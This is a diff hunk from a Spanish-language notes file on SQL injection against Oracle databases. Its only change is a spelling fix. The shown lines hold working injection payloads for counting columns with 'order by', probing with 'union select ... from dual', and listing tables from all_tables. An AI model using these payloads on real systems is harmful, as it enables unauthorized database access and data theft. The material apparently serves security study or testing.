@@ -85,7 +85,7 @@ Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
 Una vez ya hemos identificado las columnas debemos probar con un
-`' union select 'a','b' from dual-- -` | `' union select 1,2 from dual-- -` | `' union select NULL,NULL from dual-- -`, si hubiese tres columnas seria 1,2,3 etc, hay que poner el dual pur que en Oracle siempre hay que llamar a una tabla
+`' union select 'a','b' from dual-- -` | `' union select 1,2 from dual-- -` | `' union select NULL,NULL from dual-- -`, si hubiese tres columnas seria 1,2,3 etc, hay que poner el dual por que en Oracle siempre hay que llamar a una tabla
 
 Mostrar el contenido de todas las tablas
 `' union select NULL,table_name from all_tables-- -`
